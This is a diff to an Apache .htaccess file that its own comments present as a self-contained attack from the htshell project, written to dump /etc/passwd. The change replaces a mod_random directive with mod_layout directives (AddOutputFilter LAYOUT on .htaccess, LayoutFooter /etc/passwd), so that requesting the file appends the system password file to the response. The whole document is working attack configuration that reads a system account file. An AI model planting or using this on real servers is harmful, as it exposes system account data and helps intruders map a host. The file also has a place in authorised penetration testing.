@@ -1,4 +1,3 @@
-# Untested
 # Self contained .htaccess directory traversal attack - Part of the htshell project
 # Written by Wireghoul - http://www.justanotherhacker.com
 # This attack will dump /etc/password
@@ -7,10 +6,9 @@
     Order allow,deny
     Allow from all
 </Files>
+# Enable mod_layout for .htaccess files
+AddOutputFilter LAYOUT .htaccess
 
-# Enable mod_random
-RandomEngine On
-
-SetHandler random-ad-page-ad-page
-# Specify file to read
-RandomAd /etc/passwd
+# Append the file we want below:
+LayoutFooter /etc/passwd
+##### BEGIN /etc/passwd ###########
